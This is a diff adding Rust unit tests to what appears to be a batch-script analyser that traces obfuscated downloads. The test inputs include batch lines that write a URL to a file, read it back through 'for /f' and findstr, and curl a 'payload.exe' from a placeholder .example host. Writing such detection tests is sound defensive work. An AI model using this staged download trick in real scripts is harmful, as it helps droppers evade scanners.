@@ -3607,6 +3607,29 @@ for /f "tokens=* delims=" %%U in ('find "https://" web.txt') do curl -o payload.
     }
 
     #[test]
+    fn for_f_findstr_reads_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>web.txt
+echo https://for-f-findstr-file.example/payload.exe>>web.txt
+for /f "tokens=* delims=" %%U in ('findstr /i "https://" web.txt') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-file.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr file source did not feed later curl: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_sort_reads_generated_file_source() {
         let report = analyze(
             br#"echo noise>urls.txt
@@ -14322,6 +14345,25 @@ mod synth_tests {
                 .all(|l| l.to_ascii_lowercase().contains("alpha")),
             "unexpected non-alpha lines: {:?}",
             lines
+        );
+    }
+
+    #[test]
+    fn synth_findstr_reads_tracked_file_argument() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "web.txt".to_string(),
+            FsEntry::Content {
+                content: b"noise\r\nhttps://findstr-file.example/payload.exe\r\n".to_vec(),
+                append: false,
+            },
+        );
+
+        let lines = run_pipeline(r#"findstr /i "https://" web.txt"#, &mut env);
+
+        assert_eq!(
+            lines,
+            vec!["https://findstr-file.example/payload.exe".to_string()]
         );
     }
 
